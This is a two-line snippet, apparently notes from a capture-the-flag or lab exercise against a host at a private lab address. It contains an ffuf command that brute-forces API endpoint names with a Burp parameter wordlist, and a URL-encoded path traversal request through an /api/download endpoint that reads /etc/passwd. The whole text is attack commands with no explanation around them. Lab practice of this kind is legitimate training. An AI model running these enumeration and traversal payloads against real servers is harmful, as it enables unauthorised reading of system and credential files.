```
ffuf -w burp-parameter-names.txt -u http://10.129.202.133:3000/api/FUZZ

http://10.129.202.133:3000/api/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
